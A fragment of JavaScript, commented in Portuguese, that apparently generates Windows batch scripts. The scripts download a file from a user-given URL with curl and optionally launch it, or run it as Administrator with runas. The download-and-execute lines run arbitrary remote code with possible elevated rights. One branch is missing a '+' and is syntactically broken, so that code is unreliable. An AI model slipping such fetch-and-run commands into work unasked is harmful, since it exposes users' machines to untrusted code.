                        `set "destino=%USERPROFILE%\Downloads\%filename%"\n`+
                        `curl "%url%" -o "%destino%"\n`+
                        `runas /user:Administrator "%destino%"\n` +
                        `endlocal\n`;
    } else if (automaticCheckbox) {
        // Caso apenas a opção automática esteja ativada
        scriptContent = 
                        `setlocal\n`+
                        `set "url=${urlDownload}"\n`+
                        `for /f "delims=/ tokens=*" %%i in ("%url%") do set "filename=%%~nxi"\n`+
                        `set "destino=%USERPROFILE%\Downloads\%filename%"\n`+
                        `curl "%url%" -o "%destino%"\n`+
                        `start "" "%destino%"`
                        `endlocal\n`;
    } else {
        // Caso nenhuma opção esteja ativada
        scriptContent = 
                        `setlocal\n`+
                        `set "url=${urlDownload}"\n`+
                        `for /f "delims=/ tokens=*" %%i in ("%url%") do set "filename=%%~nxi"\n`+
                        `set "destino=%USERPROFILE%\Downloads\%filename%"\n`+
                        `curl "%url%" -o "%destino%"\n`+
                        `endlocal\n`;

    }

    return scriptContent;
}























































































































































function openCustomizeMenu() {
    // Redireciona para a página principal do site (ajuste o caminho conforme necessário)
    window.location.href = '/templates/customizeMenu.html';
}
